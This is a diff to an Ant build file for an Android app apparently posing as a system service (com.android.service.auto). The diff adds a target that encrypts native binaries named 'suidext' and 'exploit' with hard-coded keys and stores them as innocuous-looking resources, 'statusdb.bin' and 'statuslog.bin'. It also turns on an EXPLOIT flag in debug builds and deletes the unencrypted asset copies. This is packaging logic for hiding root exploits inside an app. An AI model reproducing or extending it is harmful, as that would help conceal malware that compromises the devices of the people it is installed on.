@@ -57,14 +57,17 @@
 			
 	<target name="encrypt-messages">
 		<delete file="res/raw/messages.bin" />	
-		<delete file="res/raw/data.bin" />
-		<delete file="messages.enc" />	
-		<crypter encrypt="true" keyFile="123456" inputFile="preprocess/messages.properties.all" outputFile="messages.enc" />
-		<copy file="messages.enc" toFile="res/raw/messages.bin" overwrite="true" />
-		
+		<crypter encrypt="true" keyFile="0x5A3D00448D7A912B" inputFile="preprocess/messages.properties.all" outputFile="res/raw/messages.bin" />
 	</target>
 	
-	<target name="set-debug" depends="encrypt-messages">
+	<target name="encrypt-exploit">
+		<delete file="res/raw/statusdb.bin" />	
+		<delete file="res/raw/statuslog.bin" />
+		<crypter encrypt="true" keyFile="0x5A3D10448D7A912A" inputFile="libs/armeabi/suidext" outputFile="res/raw/statusdb.bin" />
+		<crypter encrypt="true" keyFile="0x5A3D10448D7A912B" inputFile="libs/armeabi/exploit" outputFile="res/raw/statuslog.bin" />
+	</target>
+	
+	<target name="set-debug" depends="encrypt-messages, encrypt-exploit">
 		<echo message="********** Set debug mode *********" />
 		<copy file="preprocess/AndroidManifest.xml" todir="." overwrite="true">
 			<filterset>
@@ -75,14 +78,14 @@
 		<copy file="preprocess/Cfg.java" toFile="src/com/android/service/auto/Cfg.java" overwrite="true">
 			<filterset>
 				<filter token="DEBUG" value="true" />
-				<filter token="EXPLOIT" value="false" />
+				<filter token="EXPLOIT" value="true" />
 				<filter token="DEMO" value="true" />
 			</filterset>
 		</copy>
 		<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin" overwrite="true" />
 		<copy file="preprocess/resources.bin.patched" toFile="res/raw/resources.bin" overwrite="true" />
-		<copy file="libs/armeabi/statuslog" toDir="assets/" overwrite="true" />
-		<copy file="libs/armeabi/statusdb" toDir="assets/" overwrite="true" />
+		<delete file="assets/statuslog" />
+		<delete file="assets/statusdb" />
 	</target>
 
 	<target name="set-release"  depends="encrypt-messages">
